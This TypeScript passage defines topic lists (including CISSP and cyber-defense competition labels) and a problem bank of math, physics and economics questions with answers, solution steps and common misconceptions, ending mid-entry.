export type EducationLevel = "k12" | "university" | "professional" | "competition";

export interface Problem {
	id: string;
	topic: string;
	subtopic: string;
	educationLevel: EducationLevel;
	gradeLevel: number;
	question: string;
	correctAnswer: string;
	solutionSteps: string[];
	commonMisconceptions: string[];
	prerequisites: string[];
	difficulty: "foundational" | "on-grade" | "stretch";
}

export const K12_TOPICS = [
	"linear-equations",
	"fractions-decimals",
	"proportional-reasoning",
	"expressions",
	"geometry",
	"physics-mechanics",
	"physics-energy",
] as const;

export const UNIVERSITY_TOPICS = [
	"calculus",
	"linear-algebra",
	"statistics",
	"classical-mechanics",
	"electromagnetism",
	"thermodynamics",
	"microeconomics",
	"organic-chemistry",
] as const;

export const PROFESSIONAL_TOPICS = [
	"cissp-security-risk-mgmt",
	"cissp-asset-security",
	"cissp-security-architecture",
	"cissp-network-security",
	"cissp-iam",
	"cissp-security-assessment",
	"cissp-security-operations",
	"cissp-software-security",
] as const;

export const COMPETITION_TOPICS = [
	"ncae-linux-hardening",
	"ncae-network-defense",
	"ncae-service-uptime",
	"ncae-scripting",
	"ncae-incident-response",
	"ncae-ctf-crypto",
	"ncae-ctf-forensics",
	"ncae-windows-hardening",
] as const;

export const TOPICS = [...K12_TOPICS, ...UNIVERSITY_TOPICS, ...PROFESSIONAL_TOPICS, ...COMPETITION_TOPICS] as const;

export type Topic = (typeof TOPICS)[number];

export const TOPIC_LABELS: Record<Topic, string> = {
	"linear-equations": "Linear Equations",
	"fractions-decimals": "Fractions & Decimals",
	"proportional-reasoning": "Proportional Reasoning",
	expressions: "Expressions & Variables",
	geometry: "Geometry",
	"physics-mechanics": "Physics: Forces & Motion",
	"physics-energy": "Physics: Energy & Work",
	calculus: "Calculus",
	"linear-algebra": "Linear Algebra",
	statistics: "Statistics & Probability",
	"classical-mechanics": "Classical Mechanics",
	electromagnetism: "Electromagnetism",
	thermodynamics: "Thermodynamics",
	microeconomics: "Microeconomics",
	"organic-chemistry": "Organic Chemistry",
	"cissp-security-risk-mgmt": "Domain 1: Security & Risk Management",
	"cissp-asset-security": "Domain 2: Asset Security",
	"cissp-security-architecture": "Domain 3: Security Architecture & Engineering",
	"cissp-network-security": "Domain 4: Communication & Network Security",
	"cissp-iam": "Domain 5: Identity & Access Management",
	"cissp-security-assessment": "Domain 6: Security Assessment & Testing",
	"cissp-security-operations": "Domain 7: Security Operations",
	"cissp-software-security": "Domain 8: Software Development Security",
	"ncae-linux-hardening": "Linux System Hardening",
	"ncae-network-defense": "Network Defense",
	"ncae-service-uptime": "Service Configuration & Uptime",
	"ncae-scripting": "Scripting & Automation",
	"ncae-incident-response": "Incident Detection & Response",
	"ncae-ctf-crypto": "CTF: Cryptography",
	"ncae-ctf-forensics": "CTF: Digital Forensics",
	"ncae-windows-hardening": "Windows System Hardening",
};

export function getTopicsForLevel(level: EducationLevel): Topic[] {
	if (level === "competition") return [...COMPETITION_TOPICS];
	if (level === "professional") return [...PROFESSIONAL_TOPICS];
	if (level === "university") return [...UNIVERSITY_TOPICS];
	return [...K12_TOPICS];
}

const PROBLEM_BANK: Problem[] = [
	// ── Linear Equations ──
	{
		id: "le-1",
		topic: "linear-equations",
		subtopic: "one-step",
		educationLevel: "k12",
		gradeLevel: 7,
		question: "Solve for x:  x + 14 = 31",
		correctAnswer: "x = 17",
		solutionSteps: [
			"We need to isolate x on one side of the equation.",
			"Subtract 14 from both sides: x + 14 - 14 = 31 - 14",
			"Simplify: x = 17",
		],
		commonMisconceptions: [
			"Adding 14 to both sides instead of subtracting",
			"Computing 31 - 14 incorrectly (arithmetic error)",
			"Not understanding what 'solve for x' means",
		],
		prerequisites: ["addition", "subtraction", "equality"],
		difficulty: "foundational",
	},
	{
		id: "le-2",
		topic: "linear-equations",
		subtopic: "two-step",
		educationLevel: "k12",
		gradeLevel: 7,
		question: "Solve for x:  3x - 7 = 14",
		correctAnswer: "x = 7",
		solutionSteps: [
			"First, add 7 to both sides: 3x - 7 + 7 = 14 + 7",
			"Simplify: 3x = 21",
			"Divide both sides by 3: x = 21 ÷ 3 = 7",
		],
		commonMisconceptions: [
			"Dividing before adding (incorrect order of operations)",
			"Dividing only one side by 3",
			"Subtracting 7 instead of adding",
			"Dividing 14 by 3 directly without first isolating the term with x",
		],
		prerequisites: ["one-step equations", "multiplication", "division"],
		difficulty: "foundational",
	},
	{
		id: "le-3",
		topic: "linear-equations",
		subtopic: "variables-both-sides",
		educationLevel: "k12",
		gradeLevel: 8,
		question: "Solve for x:  5x + 3 = 2x + 18",
		correctAnswer: "x = 5",
		solutionSteps: [
			"Subtract 2x from both sides: 5x - 2x + 3 = 18",
			"Simplify: 3x + 3 = 18",
			"Subtract 3 from both sides: 3x = 15",
			"Divide both sides by 3: x = 5",
		],
		commonMisconceptions: [
			"Not knowing how to handle variables on both sides",
			"Subtracting 5x from both sides and getting confused by negative coefficients",
			"Adding the variable terms instead of subtracting",
			"Forgetting to apply the same operation to both sides",
		],
		prerequisites: ["two-step equations", "combining like terms"],
		difficulty: "on-grade",
	},
	{
		id: "le-4",
		topic: "linear-equations",
		subtopic: "distributive-property",
		educationLevel: "k12",
		gradeLevel: 8,
		question: "Solve for x:  2(x + 4) = 22",
		correctAnswer: "x = 7",
		solutionSteps: [
			"Distribute the 2: 2·x + 2·4 = 22 → 2x + 8 = 22",
			"Subtract 8 from both sides: 2x = 14",
			"Divide both sides by 2: x = 7",
		],
		commonMisconceptions: [
			"Only multiplying x by 2 but not the 4 (partial distribution)",
			"Adding 2 and 4 instead of multiplying",
			"Trying to divide by 2 first without distributing",
		],
		prerequisites: [
			"distributive property",
			"two-step equations",
			"multiplication",
		],
		difficulty: "on-grade",
	},

	// ── Fractions & Decimals ──
	{
		id: "fd-1",
		topic: "fractions-decimals",
		subtopic: "adding-fractions",
		educationLevel: "k12",
		gradeLevel: 6,
		question: "Compute:  2/3 + 1/4",
		correctAnswer: "11/12",
		solutionSteps: [
			"Find a common denominator. The LCD of 3 and 4 is 12.",
			"Convert: 2/3 = 8/12 and 1/4 = 3/12",
			"Add the numerators: 8/12 + 3/12 = 11/12",
		],
		commonMisconceptions: [
			"Adding numerators and denominators separately (getting 3/7)",
			"Not finding a common denominator",
			"Finding LCD but converting numerators incorrectly",
		],
		prerequisites: [
			"equivalent fractions",
			"least common multiple",
			"basic fractions",
		],
		difficulty: "foundational",
	},
	{
		id: "fd-2",
		topic: "fractions-decimals",
		subtopic: "multiplying-fractions",
		educationLevel: "k12",
		gradeLevel: 6,
		question: "Compute:  3/5 × 2/7",
		correctAnswer: "6/35",
		solutionSteps: [
			"Multiply the numerators: 3 × 2 = 6",
			"Multiply the denominators: 5 × 7 = 35",
			"Result: 6/35 (already in simplest form)",
		],
		commonMisconceptions: [
			"Cross-multiplying instead of straight multiplication",
			"Trying to find a common denominator (confusing with addition)",
			"Forgetting to multiply denominators",
		],
		prerequisites: ["basic fractions", "multiplication"],
		difficulty: "foundational",
	},
	{
		id: "fd-3",
		topic: "fractions-decimals",
		subtopic: "decimal-to-fraction",
		educationLevel: "k12",
		gradeLevel: 7,
		question: "Convert 0.375 to a fraction in simplest form.",
		correctAnswer: "3/8",
		solutionSteps: [
			"0.375 = 375/1000",
			"Find GCD of 375 and 1000. GCD = 125.",
			"Divide both by 125: 375÷125 = 3, 1000÷125 = 8",
			"Result: 3/8",
		],
		commonMisconceptions: [
			"Writing 375/100 instead of 375/1000 (wrong place value)",
			"Not simplifying the fraction",
			"Confusing place values (tenths vs hundredths vs thousandths)",
		],
		prerequisites: ["place value", "GCD", "simplifying fractions"],
		difficulty: "on-grade",
	},

	// ── Proportional Reasoning ──
	{
		id: "pr-1",
		topic: "proportional-reasoning",
		subtopic: "unit-rates",
		educationLevel: "k12",
		gradeLevel: 7,
		question:
			"A car travels 240 miles using 8 gallons of gas. What is the car's fuel efficiency in miles per gallon?",
		correctAnswer: "30 miles per gallon",
		solutionSteps: [
			"Fuel efficiency = total miles ÷ total gallons",
			"240 ÷ 8 = 30",
			"The car gets 30 miles per gallon.",
		],
		commonMisconceptions: [
			"Dividing gallons by miles instead (getting 0.033...)",
			"Multiplying instead of dividing",
			"Not understanding what 'per gallon' means (unit rate concept)",
		],
		prerequisites: ["division", "rates", "units"],
		difficulty: "foundational",
	},
	{
		id: "pr-2",
		topic: "proportional-reasoning",
		subtopic: "proportions",
		educationLevel: "k12",
		gradeLevel: 7,
		question:
			"If 3 notebooks cost $7.50, how much would 8 notebooks cost at the same rate?",
		correctAnswer: "$20.00",
		solutionSteps: [
			"Find the unit price: $7.50 ÷ 3 = $2.50 per notebook",
			"Multiply by 8: $2.50 × 8 = $20.00",
			"Alternatively: set up proportion 3/7.50 = 8/x, cross multiply: 3x = 60, x = 20",
		],
		commonMisconceptions: [
			"Adding $7.50 + 8 or other additive reasoning instead of multiplicative",
			"Setting up the proportion incorrectly",
			"Computing the unit rate but multiplying by the wrong number",
		],
		prerequisites: ["unit rates", "multiplication", "division"],
		difficulty: "on-grade",
	},
	{
		id: "pr-3",
		topic: "proportional-reasoning",
		subtopic: "percent",
		educationLevel: "k12",
		gradeLevel: 7,
		question: "A shirt originally costs $45. It is on sale for 20% off. What is the sale price?",
		correctAnswer: "$36",
		solutionSteps: [
			"Calculate the discount: 20% of $45 = 0.20 × 45 = $9",
			"Subtract from original: $45 - $9 = $36",
			"Alternatively: 80% of $45 = 0.80 × 45 = $36",
		],
		commonMisconceptions: [
			"Computing 20% of 45 as $20 (confusing percent with dollar amount)",
			"Adding the discount instead of subtracting",
			"Moving the decimal incorrectly when converting percent to decimal",
			"Thinking 20% off means the price is $20",
		],
		prerequisites: ["percent", "decimal conversion", "multiplication"],
		difficulty: "on-grade",
	},

	// ── Expressions & Variables ──
	{
		id: "ex-1",
		topic: "expressions",
		subtopic: "evaluating",
		educationLevel: "k12",
		gradeLevel: 7,
		question: "Evaluate:  4a + 3b  when a = 5 and b = 2",
		correctAnswer: "26",
		solutionSteps: [
			"Substitute a = 5: 4(5) + 3b = 20 + 3b",
			"Substitute b = 2: 20 + 3(2) = 20 + 6",
			"Add: 20 + 6 = 26",
		],
		commonMisconceptions: [
			"Interpreting 4a as 4 + a instead of 4 × a",
			"Substituting values for the wrong variables",
			"Order of operations errors (adding before multiplying)",
		],
		prerequisites: [
			"variables",
			"multiplication",
			"order of operations",
		],
		difficulty: "foundational",
	},
	{
		id: "ex-2",
		topic: "expressions",
		subtopic: "combining-like-terms",
		educationLevel: "k12",
		gradeLevel: 8,
		question: "Simplify:  7x + 3 - 2x + 9",
		correctAnswer: "5x + 12",
		solutionSteps: [
			"Identify like terms: 7x and -2x are like terms; 3 and 9 are like terms",
			"Combine variable terms: 7x - 2x = 5x",
			"Combine constant terms: 3 + 9 = 12",
			"Result: 5x + 12",
		],
		commonMisconceptions: [
			"Combining unlike terms (adding 7x + 3 to get 10x)",
			"Not understanding what 'like terms' means",
			"Treating -2x as +2x (sign errors)",
			"Combining everything into one term",
		],
		prerequisites: ["variables", "like terms", "signed numbers"],
		difficulty: "on-grade",
	},

	// ── Geometry ──
	{
		id: "ge-1",
		topic: "geometry",
		subtopic: "area-rectangle",
		educationLevel: "k12",
		gradeLevel: 6,
		question:
			"A rectangle has a length of 12 cm and a width of 5 cm. What is its area?",
		correctAnswer: "60 cm²",
		solutionSteps: [
			"Area of a rectangle = length × width",
			"Area = 12 × 5 = 60",
			"Include units: 60 cm²",
		],
		commonMisconceptions: [
			"Using the perimeter formula instead (adding sides)",
			"Forgetting square units (writing cm instead of cm²)",
			"Confusing area and perimeter",
		],
		prerequisites: ["multiplication", "area concept", "units"],
		difficulty: "foundational",
	},
	{
		id: "ge-2",
		topic: "geometry",
		subtopic: "pythagorean-theorem",
		educationLevel: "k12",
		gradeLevel: 8,
		question:
			"A right triangle has legs of length 6 and 8. What is the length of the hypotenuse?",
		correctAnswer: "10",
		solutionSteps: [
			"Use the Pythagorean theorem: a² + b² = c²",
			"Substitute: 6² + 8² = c²",
			"Compute: 36 + 64 = c² → 100 = c²",
			"Take square root: c = √100 = 10",
		],
		commonMisconceptions: [
			"Adding the legs directly (6 + 8 = 14)",
			"Forgetting to take the square root at the end",
			"Squaring incorrectly (e.g., 6² = 12 instead of 36)",
			"Not knowing which side is the hypotenuse",
		],
		prerequisites: [
			"exponents",
			"square roots",
			"right triangles",
			"Pythagorean theorem",
		],
		difficulty: "on-grade",
	},
	{
		id: "ge-3",
		topic: "geometry",
		subtopic: "volume-cylinder",
		educationLevel: "k12",
		gradeLevel: 8,
		question:
			"A cylinder has a radius of 3 cm and a height of 10 cm. What is its volume? (Use π ≈ 3.14)",
		correctAnswer: "282.6 cm³",
		solutionSteps: [
			"Volume of a cylinder = π × r² × h",
			"Substitute: V = 3.14 × 3² × 10",
			"Compute r²: 3² = 9",
			"Multiply: 3.14 × 9 = 28.26",
			"Multiply by height: 28.26 × 10 = 282.6 cm³",
		],
		commonMisconceptions: [
			"Using diameter instead of radius",
			"Forgetting to square the radius (using πrh instead of πr²h)",
			"Squaring both radius and height",
			"Confusing volume and surface area formulas",
		],
		prerequisites: [
			"exponents",
			"area of circle",
			"multiplication with decimals",
		],
		difficulty: "stretch",
	},

	// ── K-12 Physics: Forces & Motion ──
	{
		id: "pm-1",
		topic: "physics-mechanics",
		subtopic: "newtons-second-law",
		educationLevel: "k12",
		gradeLevel: 9,
		question:
			"A 10 kg box is pushed with a force of 50 N across a frictionless surface. What is the acceleration of the box?",
		correctAnswer: "5 m/s²",
		solutionSteps: [
			"Use Newton's second law: F = ma",
			"Rearrange for acceleration: a = F/m",
			"Substitute: a = 50 N / 10 kg = 5 m/s²",
		],
		commonMisconceptions: [
			"Multiplying force by mass instead of dividing",
			"Forgetting units (m/s²)",
			"Confusing mass and weight",
		],
		prerequisites: ["division", "units", "force concept"],
		difficulty: "foundational",
	},
	{
		id: "pm-2",
		topic: "physics-mechanics",
		subtopic: "velocity-acceleration",
		educationLevel: "k12",
		gradeLevel: 9,
		question:
			"A car accelerates from rest at 3 m/s² for 8 seconds. What is its final velocity?",
		correctAnswer: "24 m/s",
		solutionSteps: [
			"Use the kinematic equation: v = v₀ + at",
			"Initial velocity v₀ = 0 (starts from rest)",
			"Substitute: v = 0 + (3)(8) = 24 m/s",
		],
		commonMisconceptions: [
			"Not recognizing 'from rest' means v₀ = 0",
			"Confusing velocity and acceleration",
			"Using the wrong kinematic equation",
		],
		prerequisites: ["multiplication", "velocity", "acceleration"],
		difficulty: "foundational",
	},
	{
		id: "pm-3",
		topic: "physics-mechanics",
		subtopic: "friction",
		educationLevel: "k12",
		gradeLevel: 10,
		question:
			"A 5 kg block sits on a surface with a coefficient of kinetic friction μk = 0.3. What is the friction force? (Use g = 10 m/s²)",
		correctAnswer: "15 N",
		solutionSteps: [
			"Calculate the normal force: N = mg = 5 × 10 = 50 N",
			"Apply friction formula: f = μk × N",
			"Substitute: f = 0.3 × 50 = 15 N",
		],
		commonMisconceptions: [
			"Using mass instead of weight for the normal force",
			"Confusing static and kinetic friction coefficients",
			"Forgetting to multiply by g to get weight",
		],
		prerequisites: ["newtons-second-law", "multiplication with decimals"],
		difficulty: "on-grade",
	},

	// ── K-12 Physics: Energy & Work ──
	{
		id: "pe-1",
		topic: "physics-energy",
		subtopic: "kinetic-energy",
		educationLevel: "k12",
		gradeLevel: 9,
		question:
			"A 2 kg ball moves at 6 m/s. What is its kinetic energy?",
		correctAnswer: "36 J",
		solutionSteps: [
			"Use the kinetic energy formula: KE = ½mv²",
			"Substitute: KE = ½(2)(6²) = ½(2)(36)",
			"Compute: KE = 36 J",
		],
		commonMisconceptions: [
			"Forgetting to square the velocity",
			"Forgetting the ½ factor",
			"Squaring mass instead of velocity",
		],
		prerequisites: ["exponents", "multiplication", "energy concept"],
		difficulty: "foundational",
	},
	{
		id: "pe-2",
		topic: "physics-energy",
		subtopic: "work",
		educationLevel: "k12",
		gradeLevel: 9,
		question:
			"You push a box with 40 N of force over a distance of 5 meters in the direction of the force. How much work did you do?",
		correctAnswer: "200 J",
		solutionSteps: [
			"Use the work formula: W = F × d (when force is in direction of motion)",
			"Substitute: W = 40 × 5 = 200 J",
			"Work is measured in Joules (J)",
		],
		commonMisconceptions: [
			"Dividing force by distance instead of multiplying",
			"Confusing work with power",
			"Not recognizing that force must be in direction of displacement",
		],
		prerequisites: ["multiplication", "force concept", "distance"],
		difficulty: "foundational",
	},
	{
		id: "pe-3",
		topic: "physics-energy",
		subtopic: "conservation-of-energy",
		educationLevel: "k12",
		gradeLevel: 10,
		question:
			"A 4 kg object is dropped from a height of 20 m. What is its speed just before hitting the ground? (Use g = 10 m/s², ignore air resistance)",
		correctAnswer: "20 m/s",
		solutionSteps: [
			"Use conservation of energy: mgh = ½mv²",
			"Mass cancels: gh = ½v²",
			"Rearrange: v² = 2gh = 2(10)(20) = 400",
			"Take square root: v = √400 = 20 m/s",
		],
		commonMisconceptions: [
			"Forgetting to take the square root",
			"Not canceling mass from both sides",
			"Confusing potential and kinetic energy formulas",
			"Using v = gh instead of v = √(2gh)",
		],
		prerequisites: ["kinetic-energy", "potential energy", "square roots"],
		difficulty: "on-grade",
	},

	// ══════════════════════════════════════
	// ── UNIVERSITY / COLLEGE LEVEL ──
	// ══════════════════════════════════════

	// ── Calculus ──
	{
		id: "calc-1",
		topic: "calculus",
		subtopic: "derivatives",
		educationLevel: "university",
		gradeLevel: 13,
		question: "Find the derivative of f(x) = 3x⁴ - 2x² + 7x - 5",
		correctAnswer: "f'(x) = 12x³ - 4x + 7",
		solutionSteps: [
			"Apply the power rule to each term: d/dx[xⁿ] = nxⁿ⁻¹",
			"d/dx[3x⁴] = 12x³",
			"d/dx[-2x²] = -4x",
			"d/dx[7x] = 7",
			"d/dx[-5] = 0 (constant rule)",
			"Combine: f'(x) = 12x³ - 4x + 7",
		],
		commonMisconceptions: [
			"Not reducing the exponent by 1 after multiplying",
			"Treating constants as variables (derivative of -5 should be 0)",
			"Applying the power rule incorrectly to negative coefficients",
		],
		prerequisites: ["power rule", "polynomial functions", "basic derivatives"],
		difficulty: "foundational",
	},
	{
		id: "calc-2",
		topic: "calculus",
		subtopic: "chain-rule",
		educationLevel: "university",
		gradeLevel: 13,
		question: "Find the derivative of f(x) = (2x + 3)⁵",
		correctAnswer: "f'(x) = 10(2x + 3)⁴",
		solutionSteps: [
			"Identify the outer function u⁵ and inner function u = 2x + 3",
			"Apply chain rule: d/dx[u⁵] = 5u⁴ · du/dx",
			"Find du/dx = 2",
			"Combine: f'(x) = 5(2x + 3)⁴ · 2 = 10(2x + 3)⁴",
		],
		commonMisconceptions: [
			"Forgetting to multiply by the derivative of the inner function",
			"Applying the power rule without the chain rule",
			"Getting the inner derivative wrong",
		],
		prerequisites: ["power rule", "composite functions"],
		difficulty: "on-grade",
	},
	{
		id: "calc-3",
		topic: "calculus",
		subtopic: "integration",
		educationLevel: "university",
		gradeLevel: 13,
		question: "Evaluate the definite integral: ∫₀² (3x² + 2x) dx",
		correctAnswer: "12",
		solutionSteps: [
			"Find the antiderivative: ∫(3x² + 2x)dx = x³ + x² + C",
			"Apply the Fundamental Theorem of Calculus: F(2) - F(0)",
			"F(2) = 2³ + 2² = 8 + 4 = 12",
			"F(0) = 0³ + 0² = 0",
			"Result: 12 - 0 = 12",
		],
		commonMisconceptions: [
			"Forgetting to increase the exponent when integrating",
			"Not evaluating at both bounds",
			"Confusing differentiation and integration rules",
		],
		prerequisites: ["antiderivatives", "power rule for integration", "definite integrals"],
		difficulty: "on-grade",
	},

	// ── Linear Algebra ──
	{
		id: "la-1",
		topic: "linear-algebra",
		subtopic: "matrix-multiplication",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"Compute the product AB where A = [[1, 2], [3, 4]] and B = [[5, 6], [7, 8]]",
		correctAnswer: "[[19, 22], [43, 50]]",
		solutionSteps: [
			"For entry (1,1): 1·5 + 2·7 = 5 + 14 = 19",
			"For entry (1,2): 1·6 + 2·8 = 6 + 16 = 22",
			"For entry (2,1): 3·5 + 4·7 = 15 + 28 = 43",
			"For entry (2,2): 3·6 + 4·8 = 18 + 32 = 50",
			"Result: [[19, 22], [43, 50]]",
		],
		commonMisconceptions: [
			"Multiplying corresponding entries element-wise instead of row-by-column",
			"Getting rows and columns mixed up",
			"Arithmetic errors in summing products",
		],
		prerequisites: ["matrix notation", "dot product", "arithmetic"],
		difficulty: "foundational",
	},
	{
		id: "la-2",
		topic: "linear-algebra",
		subtopic: "determinant",
		educationLevel: "university",
		gradeLevel: 13,
		question: "Find the determinant of the matrix A = [[3, 1], [5, 2]]",
		correctAnswer: "1",
		solutionSteps: [
			"For a 2×2 matrix [[a, b], [c, d]], det = ad - bc",
			"det(A) = (3)(2) - (1)(5) = 6 - 5 = 1",
		],
		commonMisconceptions: [
			"Computing ad + bc instead of ad - bc",
			"Using the wrong diagonal (bc - ad)",
			"Confusing with the trace (sum of diagonal elements)",
		],
		prerequisites: ["matrix notation", "arithmetic"],
		difficulty: "foundational",
	},
	{
		id: "la-3",
		topic: "linear-algebra",
		subtopic: "eigenvalues",
		educationLevel: "university",
		gradeLevel: 13,
		question: "Find the eigenvalues of the matrix A = [[4, 1], [2, 3]]",
		correctAnswer: "λ = 5 and λ = 2",
		solutionSteps: [
			"Set up the characteristic equation: det(A - λI) = 0",
			"A - λI = [[4-λ, 1], [2, 3-λ]]",
			"det = (4-λ)(3-λ) - (1)(2) = 0",
			"Expand: λ² - 7λ + 12 - 2 = 0 → λ² - 7λ + 10 = 0",
			"Factor: (λ - 5)(λ - 2) = 0",
			"Eigenvalues: λ = 5 and λ = 2",
		],
		commonMisconceptions: [
			"Forgetting to subtract λ from BOTH diagonal entries",
			"Sign errors in expanding the determinant",
			"Not setting the determinant equal to zero",
		],
		prerequisites: ["determinant", "quadratic equations", "identity matrix"],
		difficulty: "stretch",
	},

	// ── Statistics & Probability ──
	{
		id: "stat-1",
		topic: "statistics",
		subtopic: "hypothesis-testing",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"A sample of 36 observations has a mean of 52 and a population standard deviation of 6. Test whether the population mean is different from 50 at the 5% significance level. What is the z-statistic?",
		correctAnswer: "z = 2",
		solutionSteps: [
			"Identify: x̄ = 52, μ₀ = 50, σ = 6, n = 36",
			"Standard error: SE = σ/√n = 6/√36 = 6/6 = 1",
			"z-statistic: z = (x̄ - μ₀)/SE = (52 - 50)/1 = 2",
			"Since |z| = 2 > 1.96 (critical value for α = 0.05 two-tailed), reject H₀",
		],
		commonMisconceptions: [
			"Using σ instead of σ/√n for the standard error",
			"Forgetting to take the square root of n",
			"Confusing one-tailed and two-tailed critical values",
		],
		prerequisites: ["normal distribution", "standard deviation", "hypothesis testing concepts"],
		difficulty: "on-grade",
	},
	{
		id: "stat-2",
		topic: "statistics",
		subtopic: "probability-distributions",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"A fair die is rolled 3 times. What is the probability of getting exactly 2 sixes?",
		correctAnswer: "5/72 ≈ 0.0694",
		solutionSteps: [
			"This is a binomial probability: P(X=k) = C(n,k) × p^k × (1-p)^(n-k)",
			"n = 3, k = 2, p = 1/6",
			"C(3,2) = 3",
			"P(X=2) = 3 × (1/6)² × (5/6)¹ = 3 × 1/36 × 5/6 = 15/216 = 5/72",
		],
		commonMisconceptions: [
			"Forgetting the binomial coefficient C(n,k)",
			"Using p for both success and failure terms",
			"Computing (1/6)³ instead of (1/6)²(5/6)¹",
		],
		prerequisites: ["combinations", "probability", "exponents"],
		difficulty: "on-grade",
	},

	// ── Classical Mechanics (University) ──
	{
		id: "cm-1",
		topic: "classical-mechanics",
		subtopic: "projectile-motion",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"A projectile is launched at 30 m/s at an angle of 60° above the horizontal. What is the maximum height reached? (Use g = 10 m/s²)",
		correctAnswer: "33.75 m",
		solutionSteps: [
			"Find the vertical component: v₀y = v₀ sin(60°) = 30 × (√3/2) = 15√3 m/s",
			"At maximum height, vertical velocity = 0",
			"Use v² = v₀y² - 2gh → 0 = (15√3)² - 2(10)h",
			"0 = 675 - 20h → h = 675/20 = 33.75 m",
		],
		commonMisconceptions: [
			"Using the full velocity instead of the vertical component",
			"Confusing sin and cos for horizontal vs vertical components",
			"Forgetting that vertical velocity is zero at maximum height",
		],
		prerequisites: ["trigonometry", "kinematics", "projectile motion"],
		difficulty: "on-grade",
	},
	{
		id: "cm-2",
		topic: "classical-mechanics",
		subtopic: "torque",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"A 3 m uniform beam of mass 10 kg is supported at one end. What torque does gravity exert about the pivot? (Use g = 10 m/s²)",
		correctAnswer: "150 N·m",
		solutionSteps: [
			"For a uniform beam, the center of mass is at the midpoint: L/2 = 1.5 m from the pivot",
			"Weight of the beam: W = mg = 10 × 10 = 100 N",
			"Torque: τ = W × (L/2) = 100 × 1.5 = 150 N·m",
		],
		commonMisconceptions: [
			"Using the full length of the beam instead of the center of mass distance",
			"Forgetting that gravity acts at the center of mass for a uniform object",
			"Confusing torque with force",
		],
		prerequisites: ["forces", "center of mass", "rotational mechanics"],
		difficulty: "on-grade",
	},

	// ── Electromagnetism ──
	{
		id: "em-1",
		topic: "electromagnetism",
		subtopic: "coulombs-law",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"Two point charges of +3 μC and -5 μC are separated by 0.2 m. What is the magnitude of the electrostatic force between them? (Use k = 9 × 10⁹ N·m²/C²)",
		correctAnswer: "3.375 N",
		solutionSteps: [
			"Use Coulomb's law: F = k|q₁||q₂|/r²",
			"Convert μC to C: 3 μC = 3 × 10⁻⁶ C, 5 μC = 5 × 10⁻⁶ C",
			"F = (9 × 10⁹)(3 × 10⁻⁶)(5 × 10⁻⁶) / (0.2)²",
			"F = (9 × 10⁹)(15 × 10⁻¹²) / 0.04",
			"F = 135 × 10⁻³ / 0.04 = 3.375 N",
		],
		commonMisconceptions: [
			"Forgetting to convert microcoulombs to coulombs",
			"Not squaring the distance",
			"Sign errors with scientific notation exponents",
		],
		prerequisites: ["scientific notation", "unit conversion", "electric charge"],
		difficulty: "on-grade",
	},
	{
		id: "em-2",
		topic: "electromagnetism",
		subtopic: "ohms-law",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"A circuit has two resistors in series: R₁ = 4 Ω and R₂ = 6 Ω, connected to a 20 V battery. What is the current through the circuit?",
		correctAnswer: "2 A",
		solutionSteps: [
			"Resistors in series add: R_total = R₁ + R₂ = 4 + 6 = 10 Ω",
			"Apply Ohm's law: V = IR → I = V/R",
			"I = 20/10 = 2 A",
		],
		commonMisconceptions: [
			"Using the parallel resistance formula (1/R = 1/R₁ + 1/R₂) for series circuits",
			"Applying Ohm's law to individual resistors with the total voltage",
			"Confusing series and parallel circuits",
		],
		prerequisites: ["ohms law", "series circuits", "resistance"],
		difficulty: "foundational",
	},

	// ── Thermodynamics ──
	{
		id: "thermo-1",
		topic: "thermodynamics",
		subtopic: "ideal-gas-law",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"2 moles of an ideal gas occupy 0.05 m³ at a pressure of 100 kPa. What is the temperature of the gas? (Use R = 8.314 J/(mol·K))",
		correctAnswer: "≈ 301 K",
		solutionSteps: [
			"Use the ideal gas law: PV = nRT",
			"Rearrange for T: T = PV/(nR)",
			"Convert pressure: 100 kPa = 100,000 Pa",
			"T = (100,000)(0.05) / (2)(8.314)",
			"T = 5000 / 16.628 ≈ 300.7 K ≈ 301 K",
		],
		commonMisconceptions: [
			"Not converting kPa to Pa",
			"Confusing the gas constant R values for different unit systems",
			"Putting variables on the wrong side of the equation",
		],
		prerequisites: ["ideal gas law", "unit conversion", "algebra"],
		difficulty: "on-grade",
	},
	{
		id: "thermo-2",
		topic: "thermodynamics",
		subtopic: "heat-transfer",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"How much heat is needed to raise the temperature of 0.5 kg of water from 20°C to 80°C? (Specific heat of water = 4186 J/(kg·°C))",
		correctAnswer: "125,580 J ≈ 125.6 kJ",
		solutionSteps: [
			"Use Q = mcΔT",
			"m = 0.5 kg, c = 4186 J/(kg·°C), ΔT = 80 - 20 = 60°C",
			"Q = (0.5)(4186)(60) = 125,580 J ≈ 125.6 kJ",
		],
		commonMisconceptions: [
			"Using the final temperature instead of the change in temperature",
			"Forgetting to convert grams to kilograms if needed",
			"Confusing specific heat values for different substances",
		],
		prerequisites: ["specific heat", "multiplication", "temperature"],
		difficulty: "foundational",
	},

	// ── Microeconomics ──
	{
		id: "econ-1",
		topic: "microeconomics",
		subtopic: "supply-and-demand",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"The demand curve is Qd = 100 - 2P and the supply curve is Qs = 20 + 3P. Find the equilibrium price and quantity.",
		correctAnswer: "P = 16, Q = 68",
		solutionSteps: [
			"At equilibrium, Qd = Qs",
			"Set equal: 100 - 2P = 20 + 3P",
			"Solve: 80 = 5P → P = 16",
			"Substitute back: Q = 100 - 2(16) = 100 - 32 = 68",
			"Verify: Q = 20 + 3(16) = 20 + 48 = 68 ✓",
		],
		commonMisconceptions: [
			"Setting price equal to quantity instead of Qd = Qs",
			"Sign errors when moving terms across the equation",
			"Not verifying the answer in both equations",
		],
		prerequisites: ["linear equations", "supply and demand concept"],
		difficulty: "foundational",
	},
	{
		id: "econ-2",
		topic: "microeconomics",
		subtopic: "elasticity",
		educationLevel: "university",
		gradeLevel: 13,
		question:
			"When the price of a good increases from $10 to $12, quantity demanded falls from 50 to 40 units. What is the price elasticity of demand (using the midpoint method)?",
		correctAnswer: "Ed ≈ -1.22",
		solutionSteps: [
			"Midpoint method: Ed = (ΔQ/Q_avg) / (ΔP/P_avg)",
			"ΔQ = 40 - 50 = -10, Q_avg = (50 + 40)/2 = 45",
